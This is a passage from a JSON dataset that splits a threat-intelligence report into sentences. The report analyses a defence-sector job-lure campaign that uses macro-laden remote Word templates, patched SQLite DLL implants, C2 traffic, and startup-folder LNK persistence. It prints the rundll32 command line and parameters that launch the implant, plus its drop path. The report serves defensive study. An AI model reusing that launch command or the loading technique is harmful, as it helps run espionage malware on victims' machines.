        "id": "cti_reports_filtered/r-1274.md:::S41",
        "text": "This indicates that these documents, although they are now separate, originated from the same document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S42",
        "text": "Digging into more values and metadata (we are aware they can be manipulated), we created the following overview in chronological order based on the creation date:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S43",
        "text": "When we zoom in on the DocID \u201c932E534d(..) we read the value of a template file in the XML code: \u201cSingle spaced (blank).dotx\u201d \u2013 this template name seems to be used by multiple \u201cAuthor\u201d names.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S44",
        "text": "The revision number indicates the possible changes in the document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S45",
        "text": "Note: the documents in the table with \u201cNo DocID\u201d were the \u201cdotm\u201d files containing the macros/payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S46",
        "text": "All files were created with Word 2016 and had both the English and Korean languages installed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S47",
        "text": "This analysis into the metadata indicates that there is a high confidence that the malicious documents were created from a common root document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S48",
        "text": "There were several documents flagged as non-malicious discovered during our investigation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S49",
        "text": "At first glance they did not seem important or related at all, but deeper investigation revealed how they were connected.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S50",
        "text": "These documents played a role in building the final malicious documents that ultimately got sent to the victims.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S51",
        "text": "Further analysis of these documents, based on metadata information, indicated that they contained relationships to the primary documents created by the adversary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S52",
        "text": "Two PDF files (***_SPE_LEOS and ***_HPC_SE) with aerospace & defense industry themed images, created via the Microsoft Print to PDF service, were submitted along with ***_ECS_EPM.docx.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S53",
        "text": "The naming convention of these PDF files was very similar to the malicious documents used.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S54",
        "text": "The name includes abbreviations for positions at the defense contractor much like the malicious documents.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S55",
        "text": "The Microsoft Print to PDF service enables content from a Microsoft Word document be printed to PDF directly.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S56",
        "text": "In this case these two PDF files were generated from an original Microsoft Word document with the author \u2018HOME\u2019.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S57",
        "text": "The author \u2018HOME\u2019 appeared in multiple malicious documents containing job descriptions related to aerospace, defense and the entertainment industry.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S58",
        "text": "The PDFs were discovered in an archive file indicating that LinkedIn may have been a possible vector utilized by the adversaries to target victims.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S59",
        "text": "This is a similar vector as to what has been observed in a campaign reported by industry[7], however as mentioned earlier the research covered in this blog is part of a different activity set.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S60",
        "text": "Digging into the remote template files reveals some additional insight concerning the structure of the macro code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S61",
        "text": "The second stage remote document template files contain Visual Basic macro code designed to extract a double base64 encoded DLL implant.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S62",
        "text": "The content is all encoded in UserForm1 in the remote DOTM file that is extracted by the macro code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S63",
        "text": "Further, the code will also extract the embedded decoy document (a clean document containing the job description) to display to the victim.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S64",
        "text": "The adversary used malicious DLL files, delivered through stage 2 malicious documents, to spy on targets.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S65",
        "text": "Those malicious documents were designed to drop DLL implants on the victim\u2019s machine to collect initial intelligence.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S66",
        "text": "In this campaign the adversary was utilizing patched SQL Lite DLLs to gather basic information from its targets.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S67",
        "text": "These DLLs were modified to include malicious code to be executed on the victim\u2019s machine when they\u2019re invoked under certain circumstances.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S68",
        "text": "The purpose of these DLLs is/was to gather machine information from infected victims that could be used to further identify more interesting targets.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S69",
        "text": "The first stage document sent to targeted victims contained an embedded link that downloaded the remote document template.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S70",
        "text": "The DOTM (Office template filetype) files are responsible for loading the patched DLLs onto the victim\u2019s machine to collect and gather data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S71",
        "text": "These DOTM files are created with DLL files encoded directly into the structure of the file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S72",
        "text": "These DOTM files exist on remote servers compromised by the adversary; the first stage document contains an embedded link that refers to the location of this file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S73",
        "text": "When the victim opens the document, the remote DOTM file that contains a Visual Basic macro code to load malicious DLLs, is loaded.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S74",
        "text": "Based on our analysis, these DLLs were first seen on 20 April 2020 and, to our knowledge based on age and prevalence data, these implants have been customized for this attack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S75",
        "text": "The workflow of the attack can be represented by the following image:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S76",
        "text": "To identify the malicious DLLs that will load or download the final implant, we extracted from the Office files found in the triage phase, the following DLL files:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S77",
        "text": "These DLL files are patched versions from goodware libraries, like the SQLITE library found in our analysis, and are loaded via a VBScript contained within the DOTM files that loads a double Base64 encoded DLL as described in this analysis.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S78",
        "text": "The DLL is encoded in UserForm1 (contained within the Microsoft Word macro) and the primary macro code is responsible for extracting and decoded the DLL implant.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S79",
        "text": "From our analysis, we could verify how the DLLs used in the third stage were legitimate software with a malicious implant inside that would be enabled every time a specific function was called with a set of parameters.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S80",
        "text": "Analyzing the sample statically, it was possible to extract the legitimate software used to store the implant, for example, one of the DLL files extracted from the DOTM files was a patched SQLITE library.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S81",
        "text": "If we compare the original library within the extracted DLL, we can spot lot of similarities across the two samples:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S82",
        "text": "As mentioned, the patched DLL and the original SQLITE library share a lot of code:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S83",
        "text": "The first DLL stage needs certain parameters in order to be enabled and launched in the system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S84",
        "text": "The macro code of the Office files we analyzed, contained part of these parameters:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S85",
        "text": "The data found in the VBA macro had the following details:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S86",
        "text": "- 32-bit keys that mimic a Windows SID",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S87",
        "text": "  - The first parameter belongs to the decryption key used to start the malicious activity.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S88",
        "text": "  - This could be chosen by the author to make the value more realistic\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S89",
        "text": "- Campaign ID",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S90",
        "text": "The analysis of the DLL extracted from the \u2018docm\u2019 files (the 2nd stage of the infection) revealed the existence of two types of operation for these DLLs:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S91",
        "text": "The DLL unpacks a new payload in the system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S92",
        "text": "The DLL downloads a new DLL implant from a remote server delivering an additional DLL payload into the system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S93",
        "text": "For both methods, the implant starts collecting the target information and then contacts the command and control (C2) server\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S94",
        "text": "We focused our analysis into the DLLs files that are unpacked into the system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S95",
        "text": "The DLL implant will be executed after the user interacts by opening the Office file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S96",
        "text": "As we explained, the p-code of the VBA macro contains parts of the parameters needed to execute the implant into the system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S97",
        "text": "The new DLL implant file will be unpacked (depending of the campaign ID) inside a folder inside the AppData folder of the user in execution:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S98",
        "text": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Notice\\wsdts.db",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S99",
        "text": "The DLL file, must be launched with 5 different parameters if we want to observe the malicious connection within the C2 domain; in our analysis we observed how the DLL was launched with the following command line:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S100",
        "text": "C:\\Windows\\System32\\rundll32.exe \u201cC:\\Users\\user\\AppData\\Local\\Microsoft\\Notice\\wsdts.db\u201d, sqlite3_steps S-6-81-3811-75432205-060098-6872 0 0 61 1",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S101",
        "text": "The required parameters to launch the malicious implant are:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S102",
        "text": "As we explained, the implants are patched SQLITE files",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S103",
        "text": "and",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S104",
        "text": "that is why we could find additional functions that are used to launch the malicious implant, executing the binary with certain parameters.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S105",
        "text": "It is necessary to use a specific export \u2018sqlite3_steps\u2019 plus the parameters mentioned before.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S106",
        "text": "Analyzing the code statically we could observe that the payload only checks 2 of these 5 parameters but all of them must be present in order to execute the implant:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S107",
        "text": "Attackers are always trying to remain undetected in their intrusions which is why it is common to observe techniques such as mimicking the same User-Agent that is present in the system, in order to remain under the radar.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S108",
        "text": "Using the same User-Agent string from the victim\u2019s web browser configurations, for example, will help avoid network-based detection systems from flagging outgoing traffic as suspicious.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S109",
        "text": "In this case, we observed how, through the use of the Windows API ObtainUserAgentString, the attacker obtained the User-Agent and used the value to connect to the command and control server:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S110",
        "text": "If the implant cannot detect the User-Agent in the system, it will use the default Mozilla User-Agent instead:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S111",
        "text": "Running the sample dynamically and intercepting the TLS traffic, we could see the connection to the command and control server:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S112",
        "text": "Unfortunately, during our analysis, the C2 was not active which limited our ability for further analysis.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S113",
        "text": "The data sent to the C2 channel contains the following information:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S114",
        "text": "We could find at least 5 different campaign IDs in our analysis, which suggests that the analysis in this document is merely the tip of the iceberg:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S115",
        "text": "Dotx file Campaign ID 61.dotm 0 17.dotm 17 43.dotm 43 83878C91171338902E0FE0FB97A8C47A.dotm 204 ******_dds_log 100",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S116",
        "text": "In our analysis we could observe how the adversary ensures persistence by delivering an LNK file into the startup folder\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S117",
        "text": "The value of this persistent LNK file is hardcoded inside every sample:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S118",
        "text": "Dynamically, and through the Windows APIs NtCreateFile and NtWriteFile, the LNK is written in the startup folder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S119",
        "text": "The LNK file contains the path to execute the DLL file with the required parameters.",
        "type": ""
    }
]